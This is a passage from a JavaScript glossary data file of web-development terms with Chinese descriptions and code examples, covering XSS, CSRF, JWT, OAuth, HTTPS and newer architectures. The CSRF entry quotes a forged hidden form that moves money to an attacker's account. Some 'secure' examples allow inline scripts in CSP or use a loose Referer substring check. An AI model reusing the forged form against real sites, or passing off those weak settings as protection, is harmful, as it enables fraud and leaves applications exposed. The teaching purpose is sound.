  // 方法2: 使用DOMPurify库清理输入
  const cleanComment = DOMPurify.sanitize(comment);
  document.getElementById('comments').innerHTML = cleanComment;
}

// 后端防护
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"]
    }
  }
}));`,
      useCases: ['Web安全', '用户输入验证', '内容过滤', '安全编码'],
      relatedTerms: ['csrf', 'sql injection', 'sanitization']
    },
    {
      id: 'sec_2',
      name: 'csrf',
      chinese: '跨站请求伪造',
      description: '攻击者诱导用户在已认证的网站上执行非预期操作的攻击方式',
      difficulty: 'advanced',
      tags: ['security', 'authentication', 'tokens'],
      example: `// CSRF攻击示例
// 恶意网站包含的表单
/*
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="点击领取奖品">
</form>
*/

// 防护措施1: CSRF Token
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// 前端表单包含CSRF token
/*
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input type="text" name="to" placeholder="收款账户">
  <input type="number" name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>
*/

// 防护措施2: SameSite Cookie
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    sameSite: 'strict', // 或 'lax'
    secure: true, // HTTPS环境
    httpOnly: true
  }
}));

// 防护措施3: 验证Referer头
function checkReferer(req, res, next) {
  const referer = req.get('Referer');
  const host = req.get('Host');

  if (!referer || !referer.includes(host)) {
    return res.status(403).json({ error: 'Invalid referer' });
  }

  next();
}

app.post('/sensitive-action', checkReferer, (req, res) => {
  // 处理敏感操作
});

// 防护措施4: 双重提交Cookie
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }
  res.cookie('csrf-token', req.session.csrfToken);
  next();
});`,
      useCases: ['表单保护', '状态改变操作', '金融交易', 'API安全'],
      relatedTerms: ['xss', 'authentication', 'session', 'tokens']
    },
    {
      id: 'sec_3',
      name: 'jwt',
      chinese: 'JSON Web Token',
      description: '用于安全传输信息的开放标准，常用于身份验证和信息交换',
      difficulty: 'intermediate',
      tags: ['authentication', 'tokens', 'stateless'],
      example: `const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// 用户登录
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // 验证用户
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const isValidPassword = await bcrypt.compare(password, user.password);
    if (!isValidPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // 生成JWT
    const payload = {
      userId: user.id,
      email: user.email,
      role: user.role
    };

    const accessToken = jwt.sign(
      payload,
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    const refreshToken = jwt.sign(
      { userId: user.id },
      process.env.JWT_REFRESH_SECRET,
      { expiresIn: '7d' }
    );

    // 存储refresh token
    await user.update({ refreshToken });

    res.json({
      accessToken,
      refreshToken,
      user: {
        id: user.id,
        email: user.email,
        name: user.name
      }
    });

  } catch (error) {
    res.status(500).json({ error: 'Login failed' });
  }
});

// JWT验证中间件
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }

  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Invalid or expired token' });
    }

    req.user = user;
    next();
  });
}

// 刷新token
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token required' });
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
    const user = await User.findById(decoded.userId);

    if (!user || user.refreshToken !== refreshToken) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }

    const newAccessToken = jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role
      },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });

  } catch (error) {
    res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// 使用认证中间件保护路由
app.get('/profile', authenticateToken, (req, res) => {
  res.json({ user: req.user });
});`,
      useCases: ['用户认证', 'API授权', '单点登录', '微服务通信'],
      relatedTerms: ['authentication', 'authorization', 'sessions', 'oauth']
    },
    {
      id: 'sec_4',
      name: 'oauth',
      chinese: 'OAuth授权',
      description: '开放授权标准，允许第三方应用访问用户资源而无需暴露密码',
      difficulty: 'advanced',
      tags: ['authentication', 'authorization', 'oauth'],
      example: `// OAuth 2.0 授权码流程实现
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();

// OAuth配置
const oauthConfig = {
  clientId: process.env.OAUTH_CLIENT_ID,
  clientSecret: process.env.OAUTH_CLIENT_SECRET,
  redirectUri: 'http://localhost:3000/auth/callback',
  authorizationUrl: 'https://accounts.google.com/o/oauth2/v2/auth',
  tokenUrl: 'https://oauth2.googleapis.com/token',
  userInfoUrl: 'https://www.googleapis.com/oauth2/v2/userinfo',
  scope: 'openid email profile'
};

// 生成随机state参数防止CSRF攻击
function generateState() {
  return crypto.randomBytes(32).toString('hex');
}

// 步骤1: 重定向到授权服务器
app.get('/auth/login', (req, res) => {
  const state = generateState();
  req.session.oauthState = state;

  const authUrl = new URL(oauthConfig.authorizationUrl);
  authUrl.searchParams.append('client_id', oauthConfig.clientId);
  authUrl.searchParams.append('redirect_uri', oauthConfig.redirectUri);
  authUrl.searchParams.append('response_type', 'code');
  authUrl.searchParams.append('scope', oauthConfig.scope);
  authUrl.searchParams.append('state', state);

  res.redirect(authUrl.toString());
});

// 步骤2: 处理授权回调
app.get('/auth/callback', async (req, res) => {
  const { code, state, error } = req.query;

  // 检查错误
  if (error) {
    return res.status(400).json({ error: 'Authorization failed', details: error });
  }

  // 验证state参数
  if (state !== req.session.oauthState) {
    return res.status(400).json({ error: 'Invalid state parameter' });
  }

  try {
    // 步骤3: 交换授权码获取访问令牌
    const tokenResponse = await axios.post(oauthConfig.tokenUrl, {
      client_id: oauthConfig.clientId,
      client_secret: oauthConfig.clientSecret,
      code: code,
      grant_type: 'authorization_code',
      redirect_uri: oauthConfig.redirectUri
    });

    const { access_token, refresh_token, expires_in } = tokenResponse.data;

    // 步骤4: 使用访问令牌获取用户信息
    const userResponse = await axios.get(oauthConfig.userInfoUrl, {
      headers: {
        Authorization: \`Bearer \${access_token}\`
      }
    });

    const userInfo = userResponse.data;

    // 存储用户信息和令牌
    req.session.user = {
      id: userInfo.id,
      email: userInfo.email,
      name: userInfo.name,
      picture: userInfo.picture
    };

    req.session.tokens = {
      accessToken: access_token,
      refreshToken: refresh_token,
      expiresAt: Date.now() + (expires_in * 1000)
    };

    res.redirect('/dashboard');

  } catch (error) {
    console.error('OAuth error:', error.response?.data || error.message);
    res.status(500).json({ error: 'Authentication failed' });
  }
});

// 刷新访问令牌
async function refreshAccessToken(refreshToken) {
  try {
    const response = await axios.post(oauthConfig.tokenUrl, {
      client_id: oauthConfig.clientId,
      client_secret: oauthConfig.clientSecret,
      refresh_token: refreshToken,
      grant_type: 'refresh_token'
    });

    return response.data;
  } catch (error) {
    throw new Error('Failed to refresh token');
  }
}

// 中间件：检查认证状态
async function requireAuth(req, res, next) {
  if (!req.session.user || !req.session.tokens) {
    return res.redirect('/auth/login');
  }

  // 检查令牌是否过期
  if (Date.now() >= req.session.tokens.expiresAt) {
    try {
      const newTokens = await refreshAccessToken(req.session.tokens.refreshToken);
      req.session.tokens = {
        accessToken: newTokens.access_token,
        refreshToken: newTokens.refresh_token || req.session.tokens.refreshToken,
        expiresAt: Date.now() + (newTokens.expires_in * 1000)
      };
    } catch (error) {
      req.session.destroy();
      return res.redirect('/auth/login');
    }
  }

  next();
}

// 受保护的路由
app.get('/dashboard', requireAuth, (req, res) => {
  res.json({
    message: 'Welcome to dashboard',
    user: req.session.user
  });
});

// 注销
app.get('/auth/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});

// PKCE (Proof Key for Code Exchange) 实现
function generateCodeVerifier() {
  return crypto.randomBytes(32).toString('base64url');
}

function generateCodeChallenge(verifier) {
  return crypto.createHash('sha256').update(verifier).digest('base64url');
}

// 使用PKCE的OAuth流程（更安全，适用于SPA）
app.get('/auth/pkce/login', (req, res) => {
  const state = generateState();
  const codeVerifier = generateCodeVerifier();
  const codeChallenge = generateCodeChallenge(codeVerifier);

  req.session.oauthState = state;
  req.session.codeVerifier = codeVerifier;

  const authUrl = new URL(oauthConfig.authorizationUrl);
  authUrl.searchParams.append('client_id', oauthConfig.clientId);
  authUrl.searchParams.append('redirect_uri', oauthConfig.redirectUri);
  authUrl.searchParams.append('response_type', 'code');
  authUrl.searchParams.append('scope', oauthConfig.scope);
  authUrl.searchParams.append('state', state);
  authUrl.searchParams.append('code_challenge', codeChallenge);
  authUrl.searchParams.append('code_challenge_method', 'S256');

  res.redirect(authUrl.toString());
});

// 前端JavaScript OAuth实现
/*
class OAuthClient {
  constructor(config) {
    this.config = config;
  }

  // 生成授权URL
  getAuthorizationUrl() {
    const state = this.generateRandomString();
    const codeVerifier = this.generateRandomString();
    const codeChallenge = this.generateCodeChallenge(codeVerifier);

    localStorage.setItem('oauth_state', state);
    localStorage.setItem('code_verifier', codeVerifier);

    const params = new URLSearchParams({
      client_id: this.config.clientId,
      redirect_uri: this.config.redirectUri,
      response_type: 'code',
      scope: this.config.scope,
      state: state,
      code_challenge: codeChallenge,
      code_challenge_method: 'S256'
    });

    return \`\${this.config.authorizationUrl}?\${params}\`;
  }

  // 处理授权回调
  async handleCallback() {
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');

    if (state !== localStorage.getItem('oauth_state')) {
      throw new Error('Invalid state parameter');
    }

    const codeVerifier = localStorage.getItem('code_verifier');

    const tokenResponse = await fetch('/api/oauth/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        code,
        code_verifier: codeVerifier
      })
    });

    const tokens = await tokenResponse.json();
    localStorage.setItem('access_token', tokens.access_token);
    localStorage.setItem('refresh_token', tokens.refresh_token);

    return tokens;
  }

  generateRandomString() {
    const array = new Uint32Array(28);
    crypto.getRandomValues(array);
    return Array.from(array, dec => ('0' + dec.toString(16)).substr(-2)).join('');
  }

  generateCodeChallenge(verifier) {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    return crypto.subtle.digest('SHA-256', data).then(digest => {
      return btoa(String.fromCharCode(...new Uint8Array(digest)))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=/g, '');
    });
  }
}
*/`,
      useCases: ['第三方登录', 'API授权', '单点登录', '移动应用认证'],
      relatedTerms: ['jwt', 'pkce', 'authorization code', 'access token']
    },
    {
      id: 'sec_5',
      name: 'https_ssl',
      chinese: 'HTTPS/SSL',
      description: '安全超文本传输协议，通过SSL/TLS加密保护数据传输安全',
      difficulty: 'intermediate',
      tags: ['encryption', 'security', 'certificates'],
      example: `// Node.js HTTPS服务器设置
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

// 读取SSL证书
const options = {
  key: fs.readFileSync('path/to/private-key.pem'),
  cert: fs.readFileSync('path/to/certificate.pem'),
  ca: fs.readFileSync('path/to/ca-certificate.pem') // 可选，中间证书
};

// 创建HTTPS服务器
const httpsServer = https.createServer(options, app);

// 强制HTTPS重定向中间件
function forceHTTPS(req, res, next) {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect(301, \`https://\${req.get('host')}\${req.url}\`);
  }
  next();
}

// 安全头部中间件
function securityHeaders(req, res, next) {
  // HSTS (HTTP Strict Transport Security)
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');

  // 防止内容类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // XSS保护
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // 防止点击劫持
  res.setHeader('X-Frame-Options', 'DENY');

  // CSP (Content Security Policy)
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self' https:; " +
    "connect-src 'self' https:; " +
    "frame-ancestors 'none';"
  );

  // 引用者策略
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // 权限策略
  res.setHeader('Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=()'
  );

  next();
}

app.use(forceHTTPS);
app.use(securityHeaders);

// 证书验证
function validateCertificate(cert) {
  const now = new Date();
  const notBefore = new Date(cert.valid_from);
  const notAfter = new Date(cert.valid_to);

  if (now < notBefore || now > notAfter) {
    throw new Error('Certificate is not valid');
  }

  // 检查证书链
  if (!cert.issuer || !cert.subject) {
    throw new Error('Invalid certificate format');
  }

  return true;
}

// 客户端证书验证
const clientCertOptions = {
  key: fs.readFileSync('server-key.pem'),
  cert: fs.readFileSync('server-cert.pem'),
  ca: fs.readFileSync('ca-cert.pem'),
  requestCert: true,
  rejectUnauthorized: true
};

const secureServer = https.createServer(clientCertOptions, (req, res) => {
  const cert = req.connection.getPeerCertificate();

  if (req.client.authorized) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      message: 'Authenticated with client certificate',
      subject: cert.subject,
      issuer: cert.issuer,
      valid_from: cert.valid_from,
      valid_to: cert.valid_to
    }));
  } else {
    res.writeHead(401);
    res.end('Client certificate required');
  }
});

// Let's Encrypt 自动证书管理
const acme = require('acme-client');

async function obtainCertificate(domain) {
  const accountKey = await acme.crypto.createPrivateKey();
  const client = new acme.Client({
    directoryUrl: acme.directory.letsencrypt.production,
    accountKey
  });

  const [key, csr] = await acme.crypto.createCsr({
    commonName: domain,
    altNames: [\`www.\${domain}\`]
  });

  const cert = await client.auto({
    csr,
    email: 'admin@example.com',
    termsOfServiceAgreed: true,
    challengeCreateFn: async (authz, challenge, keyAuthorization) => {
      // 实现HTTP-01或DNS-01挑战
      console.log('Challenge:', challenge);
    },
    challengeRemoveFn: async (authz, challenge, keyAuthorization) => {
      // 清理挑战
    }
  });

  return { key, cert };
}

// 证书自动续期
async function renewCertificate() {
  try {
    const { key, cert } = await obtainCertificate('example.com');

    // 保存新证书
    fs.writeFileSync('new-private-key.pem', key);
    fs.writeFileSync('new-certificate.pem', cert);

    // 重新加载服务器（零停机时间）
    process.kill(process.pid, 'SIGUSR2');

  } catch (error) {
    console.error('Certificate renewal failed:', error);
  }
}

// 定期检查证书过期
setInterval(() => {
  const cert = fs.readFileSync('certificate.pem');
  const certInfo = require('crypto').createHash('sha256').update(cert).digest('hex');

  // 检查证书是否在30天内过期
  const expiryDate = new Date(/* 从证书中解析过期时间 */);
  const daysUntilExpiry = (expiryDate - new Date()) / (1000 * 60 * 60 * 24);

  if (daysUntilExpiry < 30) {
    renewCertificate();
  }
}, 24 * 60 * 60 * 1000); // 每天检查一次

// 启动服务器
httpsServer.listen(443, () => {
  console.log('HTTPS Server running on port 443');
});

// HTTP到HTTPS重定向服务器
const http = require('http');
const httpServer = http.createServer((req, res) => {
  res.writeHead(301, {
    Location: \`https://\${req.headers.host}\${req.url}\`
  });
  res.end();
});

httpServer.listen(80, () => {
  console.log('HTTP redirect server running on port 80');
});`,
      useCases: ['数据加密', '身份验证', '网站安全', '合规要求'],
      relatedTerms: ['tls', 'certificates', 'encryption', 'hsts']
    }
  ],

  // 新兴技术 (50个术语)
  emerging: [
    {
      id: 'emerging_1',
      name: 'webassembly',
      chinese: 'Web汇编',
      description: '在Web浏览器中运行接近原生性能代码的二进制指令格式',
      difficulty: 'advanced',
      tags: ['performance', 'compilation', 'native'],
      example: `// Rust代码编译为WebAssembly
#[wasm_bindgen]
pub fn fibonacci(n: u32) -> u32 {
    match n {
        0 => 0,
        1 => 1,
        _ => fibonacci(n - 1) + fibonacci(n - 2)
    }
}

// JavaScript中使用WebAssembly
async function loadWasm() {
  const wasm = await import('./pkg/fibonacci_wasm.js');
  await wasm.default();

  // 调用WebAssembly函数
  const result = wasm.fibonacci(40);
  console.log(\`Fibonacci(40) = \${result}\`);

  // 性能对比
  console.time('WASM');
  wasm.fibonacci(40);
  console.timeEnd('WASM');

  console.time('JavaScript');
  fibonacciJS(40);
  console.timeEnd('JavaScript');
}`,
      useCases: ['高性能计算', '游戏开发', '图像处理', '科学计算'],
      relatedTerms: ['performance', 'compilation', 'rust', 'c++']
    },
    {
      id: 'emerging_2',
      name: 'graphql',
      chinese: 'GraphQL查询语言',
      description: 'API的查询语言和运行时，提供更高效、强大和灵活的数据获取方式',
      difficulty: 'intermediate',
      tags: ['api', 'query', 'data-fetching'],
      example: `// GraphQL Schema定义
const typeDefs = \`
  type User {
    id: ID!
    name: String!
    email: String!
    posts: [Post!]!
  }

  type Post {
    id: ID!
    title: String!
    content: String!
    author: User!
    comments: [Comment!]!
  }

  type Comment {
    id: ID!
    text: String!
    author: User!
  }

  type Query {
    user(id: ID!): User
    users: [User!]!
    post(id: ID!): Post
    posts: [Post!]!
  }

  type Mutation {
    createUser(name: String!, email: String!): User!
    createPost(title: String!, content: String!, authorId: ID!): Post!
    updatePost(id: ID!, title: String, content: String): Post!
    deletePost(id: ID!): Boolean!
  }

  type Subscription {
    postAdded: Post!
    commentAdded(postId: ID!): Comment!
  }
\`;

// Resolvers
const resolvers = {
  Query: {
    user: async (parent, { id }) => {
      return await User.findById(id);
    },
    users: async () => {
      return await User.findAll();
    },
    post: async (parent, { id }) => {
      return await Post.findById(id);
    },
    posts: async () => {
      return await Post.findAll();
    }
  },

  Mutation: {
    createUser: async (parent, { name, email }) => {
      return await User.create({ name, email });
    },
    createPost: async (parent, { title, content, authorId }) => {
      return await Post.create({ title, content, authorId });
    }
  },

  User: {
    posts: async (user) => {
      return await Post.findByAuthorId(user.id);
    }
  },

  Post: {
    author: async (post) => {
      return await User.findById(post.authorId);
    },
    comments: async (post) => {
      return await Comment.findByPostId(post.id);
    }
  }
};

// 客户端查询示例
const GET_USER_WITH_POSTS = \`
  query GetUserWithPosts($userId: ID!) {
    user(id: $userId) {
      id
      name
      email
      posts {
        id
        title
        content
        comments {
          id
          text
          author {
            name
          }
        }
      }
    }
  }
\`;

// 使用Apollo Client
import { useQuery, useMutation } from '@apollo/client';

function UserProfile({ userId }) {
  const { loading, error, data } = useQuery(GET_USER_WITH_POSTS, {
    variables: { userId }
  });

  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error.message}</div>;

  return (
    <div>
      <h1>{data.user.name}</h1>
      <p>{data.user.email}</p>
      <div>
        {data.user.posts.map(post => (
          <div key={post.id}>
            <h3>{post.title}</h3>
            <p>{post.content}</p>
          </div>
        ))}
      </div>
    </div>
  );
}`,
      useCases: ['API设计', '数据获取优化', '类型安全', '实时订阅'],
      relatedTerms: ['rest api', 'apollo', 'schema', 'resolvers']
    },
    {
      id: 'emerging_3',
      name: 'microservices',
      chinese: '微服务架构',
      description: '将单体应用拆分为多个小型、独立服务的架构模式',
      difficulty: 'advanced',
      tags: ['architecture', 'scalability', 'distributed'],
      example: `// 微服务架构示例

// 用户服务 (User Service)
const express = require('express');
const userApp = express();

userApp.get('/users/:id', async (req, res) => {
  try {
    const user = await getUserById(req.params.id);
    res.json(user);
  } catch (error) {
    res.status(404).json({ error: 'User not found' });
  }
});

userApp.post('/users', async (req, res) => {
  try {
    const user = await createUser(req.body);
    res.status(201).json(user);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// 订单服务 (Order Service)
const orderApp = express();

orderApp.get('/orders/:id', async (req, res) => {
  try {
    const order = await getOrderById(req.params.id);

    // 调用用户服务获取用户信息
    const userResponse = await fetch(\`http://user-service:3001/users/\${order.userId}\`);
    const user = await userResponse.json();

    res.json({ ...order, user });
  } catch (error) {
    res.status(404).json({ error: 'Order not found' });
  }
});

// API网关 (API Gateway)
const gateway = express();
const httpProxy = require('http-proxy-middleware');

// 路由配置
const services = {
  '/api/users': 'http://user-service:3001',
  '/api/orders': 'http://order-service:3002',
  '/api/products': 'http://product-service:3003',
  '/api/payments': 'http://payment-service:3004'
};

// 设置代理
Object.entries(services).forEach(([path, target]) => {
  gateway.use(path, httpProxy({
    target,
    changeOrigin: true,
    pathRewrite: {
      [\`^\${path}\`]: ''
    }
  }));
});

// 服务发现
class ServiceRegistry {
  constructor() {
    this.services = new Map();
  }

  register(serviceName, serviceUrl, healthCheckUrl) {
    this.services.set(serviceName, {
      url: serviceUrl,
      healthCheck: healthCheckUrl,
      lastSeen: Date.now(),
      healthy: true
    });
  }

  discover(serviceName) {
    const service = this.services.get(serviceName);
    return service?.healthy ? service.url : null;
  }

  async healthCheck() {
    for (const [name, service] of this.services) {
      try {
        const response = await fetch(service.healthCheck);
        service.healthy = response.ok;
        service.lastSeen = Date.now();
      } catch (error) {
        service.healthy = false;
      }
    }
  }
}

// 断路器模式
class CircuitBreaker {
  constructor(threshold = 5, timeout = 60000) {
    this.threshold = threshold;
    this.timeout = timeout;
    this.failureCount = 0;
    this.lastFailureTime = null;
    this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
  }

  async call(fn) {
    if (this.state === 'OPEN') {
      if (Date.now() - this.lastFailureTime > this.timeout) {
        this.state = 'HALF_OPEN';
      } else {
        throw new Error('Circuit breaker is OPEN');
      }
    }

    try {
      const result = await fn();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }

  onSuccess() {
    this.failureCount = 0;
    this.state = 'CLOSED';
  }

  onFailure() {
    this.failureCount++;
    this.lastFailureTime = Date.now();

    if (this.failureCount >= this.threshold) {
      this.state = 'OPEN';
    }
  }
}

// 使用断路器
const userServiceBreaker = new CircuitBreaker();

async function getUserWithCircuitBreaker(userId) {
  return userServiceBreaker.call(async () => {
    const response = await fetch(\`http://user-service:3001/users/\${userId}\`);
    if (!response.ok) throw new Error('User service error');
    return response.json();
  });
}

// Docker Compose 配置
/*
version: '3.8'
services:
  api-gateway:
    build: ./api-gateway
    ports:
      - "3000:3000"
    depends_on:
      - user-service
      - order-service
    environment:
      - NODE_ENV=production

  user-service:
    build: ./user-service
    ports:
      - "3001:3001"
    environment:
      - DATABASE_URL=mongodb://mongo:27017/users
    depends_on:
      - mongo

  order-service:
    build: ./order-service
    ports:
      - "3002:3002"
    environment:
      - DATABASE_URL=postgresql://postgres:password@postgres:5432/orders
    depends_on:
      - postgres

  mongo:
    image: mongo:latest
    volumes:
      - mongo_data:/data/db

  postgres:
    image: postgres:latest
    environment:
      - POSTGRES_DB=orders
      - POSTGRES_PASSWORD=password
    volumes:
      - postgres_data:/var/lib/postgresql/data

volumes:
  mongo_data:
  postgres_data:
*/

// Kubernetes 部署配置
/*
apiVersion: apps/v1
kind: Deployment
metadata:
  name: user-service
spec:
  replicas: 3
  selector:
    matchLabels:
      app: user-service
  template:
    metadata:
      labels:
        app: user-service
    spec:
      containers:
      - name: user-service
        image: user-service:latest
        ports:
        - containerPort: 3001
        env:
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: db-secret
              key: url
---
apiVersion: v1
kind: Service
metadata:
  name: user-service
spec:
  selector:
    app: user-service
  ports:
  - port: 3001
    targetPort: 3001
  type: ClusterIP
*/`,
      useCases: ['大型应用', '团队协作', '独立部署', '技术多样性'],
      relatedTerms: ['api gateway', 'service discovery', 'circuit breaker', 'containerization']
    },
    {
      id: 'emerging_4',
      name: 'serverless',
      chinese: '无服务器架构',
      description: '基于事件驱动的计算模型，开发者无需管理服务器基础设施',
      difficulty: 'intermediate',
      tags: ['serverless', 'cloud', 'functions'],
      example: `// AWS Lambda 函数示例
exports.handler = async (event, context) => {
  try {
    // 解析事件数据
    const { httpMethod, path, body, headers } = event;

    // 处理不同的HTTP方法
    switch (httpMethod) {
      case 'GET':
        return await handleGet(event);
      case 'POST':
        return await handlePost(JSON.parse(body));
      case 'PUT':
        return await handlePut(event.pathParameters.id, JSON.parse(body));
      case 'DELETE':
        return await handleDelete(event.pathParameters.id);
      default:
        return {
          statusCode: 405,
          body: JSON.stringify({ error: 'Method not allowed' })
        };
    }
  } catch (error) {
    console.error('Lambda error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Internal server error' })
    };
  }
};

async function handleGet(event) {
  const { id } = event.pathParameters || {};

  if (id) {
    // 获取单个资源
    const item = await getItemById(id);
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify(item)
    };
  } else {
    // 获取资源列表
    const items = await getItems(event.queryStringParameters);
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify(items)
    };
  }
}

// Serverless Framework 配置
/*
# serverless.yml
service: my-serverless-api

provider:
  name: aws
  runtime: nodejs18.x
  region: us-east-1
  environment:
    DYNAMODB_TABLE: \${self:service}-\${opt:stage, self:provider.stage}
  iamRoleStatements:
    - Effect: Allow
      Action:
        - dynamodb:Query
        - dynamodb:Scan
        - dynamodb:GetItem
        - dynamodb:PutItem
        - dynamodb:UpdateItem
        - dynamodb:DeleteItem
      Resource: "arn:aws:dynamodb:\${opt:region, self:provider.region}:*:table/\${self:provider.environment.DYNAMODB_TABLE}"

functions:
  api:
    handler: handler.handler
    events:
      - http:
          path: /{proxy+}
          method: ANY
          cors: true
      - http:
          path: /
          method: ANY
          cors: true

resources:
  Resources:
    TodosDynamoDbTable:
      Type: 'AWS::DynamoDB::Table'
      Properties:
        AttributeDefinitions:
          - AttributeName: id
            AttributeType: S
        KeySchema:
          - AttributeName: id
            KeyType: HASH
        BillingMode: PAY_PER_REQUEST
        TableName: \${self:provider.environment.DYNAMODB_TABLE}
*/

// Vercel 无服务器函数
// api/users.js
export default async function handler(req, res) {
  const { method, query, body } = req;

  // 设置CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    switch (method) {
      case 'GET':
        const users = await getUsers(query);
        res.status(200).json(users);
        break;

      case 'POST':
        const newUser = await createUser(body);
        res.status(201).json(newUser);
        break;

      default:
        res.setHeader('Allow', ['GET', 'POST']);
        res.status(405).end(\`Method \${method} Not Allowed\`);
    }
  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
}

// Netlify Functions
// netlify/functions/api.js
const { MongoClient } = require('mongodb');

exports.handler = async (event, context) => {
  // 只在冷启动时连接数据库
  if (!context.clientContext.custom.dbClient) {
    context.clientContext.custom.dbClient = new MongoClient(process.env.MONGODB_URI);
    await context.clientContext.custom.dbClient.connect();
  }

  const { httpMethod, path, body } = event;

  try {
    const db = context.clientContext.custom.dbClient.db('myapp');

    switch (httpMethod) {
      case 'GET':
        const items = await db.collection('items').find({}).toArray();
        return {
          statusCode: 200,
          body: JSON.stringify(items)
        };

      case 'POST':
        const newItem = JSON.parse(body);
        const result = await db.collection('items').insertOne(newItem);
        return {
          statusCode: 201,
          body: JSON.stringify({ id: result.insertedId, ...newItem })
        };

      default:
        return {
          statusCode: 405,
          body: JSON.stringify({ error: 'Method not allowed' })
        };
    }
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};

// 事件驱动架构
// S3事件触发的Lambda函数
exports.s3Handler = async (event) => {
  for (const record of event.Records) {
    const bucket = record.s3.bucket.name;
    const key = record.s3.object.key;

    console.log(\`Processing file: \${key} from bucket: \${bucket}\`);

    // 处理上传的文件
    if (key.endsWith('.jpg') || key.endsWith('.png')) {
      await processImage(bucket, key);
    } else if (key.endsWith('.csv')) {
      await processCSV(bucket, key);
    }
  }
};

// DynamoDB Streams 触发器
exports.dynamoHandler = async (event) => {
  for (const record of event.Records) {
    const { eventName, dynamodb } = record;

    switch (eventName) {
      case 'INSERT':
        await handleInsert(dynamodb.NewImage);
        break;
      case 'MODIFY':
        await handleUpdate(dynamodb.OldImage, dynamodb.NewImage);
        break;
      case 'REMOVE':
        await handleDelete(dynamodb.OldImage);
        break;
    }
  }
};

// 定时任务
exports.cronHandler = async (event) => {
  console.log('Running scheduled task:', event.time);

  // 执行定时任务
  await cleanupOldData();
  await sendDailyReport();
  await updateCache();

  return {
    statusCode: 200,
    body: JSON.stringify({ message: 'Scheduled task completed' })
  };
};`,
      useCases: ['事件处理', '微服务', 'API开发', '自动化任务'],
      relatedTerms: ['lambda', 'functions', 'event-driven', 'cloud computing']
    },
    {
      id: 'emerging_5',
      name: 'mcp',
      chinese: 'Model Context Protocol',
      description: 'Anthropic开发的协议，用于AI模型与外部工具和数据源的安全交互',
      difficulty: 'advanced',
      tags: ['ai', 'protocol', 'integration'],
      example: `// MCP服务器实现示例
const { MCPServer } = require('@anthropic-ai/mcp-sdk');

class FileSystemMCPServer extends MCPServer {
  constructor() {
    super({
      name: 'filesystem-server',
      version: '1.0.0',
      description: '文件系统操作MCP服务器'
    });

    this.registerTools();
  }

  registerTools() {
    // 注册文件读取工具
    this.addTool({
      name: 'read_file',
      description: '读取指定文件的内容',
      inputSchema: {
        type: 'object',
        properties: {
